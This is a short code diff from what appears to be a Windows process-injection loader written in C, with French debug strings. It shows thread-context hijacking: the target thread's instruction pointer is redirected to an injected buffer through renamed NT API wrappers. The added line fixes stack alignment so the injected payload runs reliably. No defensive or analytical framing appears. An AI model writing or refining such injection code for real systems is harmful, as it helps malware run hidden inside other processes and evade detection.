@@ -136,6 +136,7 @@ int main(int argc, char* argv[]) {
         if (st != 0) { Qn3_NtResumeThread(hThr, NULL); goto cleanup; }
 
         ctx.Rip = (DWORD64)rBuf;
+        ctx.Rsp = (ctx.Rsp & ~0xFULL) - 8;
         st = Qn3_NtSetContextThread(hThr, &ctx);
         DBG("[*] NtSetContext = 0x%08lX, nouveau RIP=0x%p\n", st, rBuf);
         if (st != 0) { Qn3_NtResumeThread(hThr, NULL); goto cleanup; }
